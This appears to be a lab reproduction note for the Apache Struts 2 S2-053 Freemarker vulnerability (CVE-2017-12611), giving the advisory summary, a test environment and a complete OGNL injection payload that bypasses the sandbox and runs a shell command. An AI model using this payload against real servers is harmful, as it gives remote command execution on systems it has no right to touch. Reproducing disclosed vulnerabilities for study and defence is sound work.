# S2-053 Demo

## Summary

| Who should read this    | All Struts 2 developers and users                            |
| :---------------------- | ------------------------------------------------------------ |
| Impact of vulnerability | A RCE attack is possible when developer is using wrong construction in Freemarker tags |
| Maximum security rating | Moderate                                                     |
| Recommendation          | Upgrade to [Struts 2.5.12](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.12) or [Struts 2.3.34](https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34) |
| Affected Software       | Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1           |
| Reporter                | Lupin <lupin1314 at gmail dot com> - [jd.com](http://jd.com/) security team David Greene <david at trumpetx dot com>Roland McIntosh <struts at rgm dot nu> |
| CVE Identifier          | CVE-2017-12611                                               |

## Environment

| Struts2 Version | Struts-2.3.24          |
| :-------------- | :--------------------- |
| Web Server      | Tomcat 8.5.53          |
| IDE             | IDEA 2020.1.1 ULTIMATE |

## POC

![image-20200814181552969](img/image-20200814114121260.png)

payload:

```xml
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}

```

